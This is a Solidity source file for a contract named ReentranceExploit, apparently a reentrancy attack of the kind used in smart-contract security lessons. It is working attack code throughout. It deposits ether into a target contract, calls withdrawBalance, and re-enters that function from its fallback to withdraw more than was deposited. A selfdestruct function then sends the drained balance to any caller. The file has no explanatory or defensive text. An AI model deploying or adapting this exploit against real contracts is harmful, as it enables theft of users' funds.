pragma solidity 0.5.10;

contract ReentranceExploit {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;
    address public owner;

    constructor() public{
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract ;
        // call addToBalance with msg.value ethers
        (bool sucess, )= vulnerable_contract.call.value(msg.value)(abi.encodePacked(keccak256("addToBalance()")));
        require(sucess);
    }

    function launch_attack() public{
        attackModeIsOn = true;
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
         (bool sucess, )= vulnerable_contract.call(abi.encodePacked(keccak256("withdrawBalance()")));
        require(sucess);
    }  


    function () external payable{
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (attackModeIsOn){
            attackModeIsOn = false;
             (bool sucess, )= vulnerable_contract.call(abi.encodePacked(keccak256("withdrawBalance()")));
                require(sucess);
        }
    }

    function get_money() public{
        selfdestruct(msg.sender);
    }

}
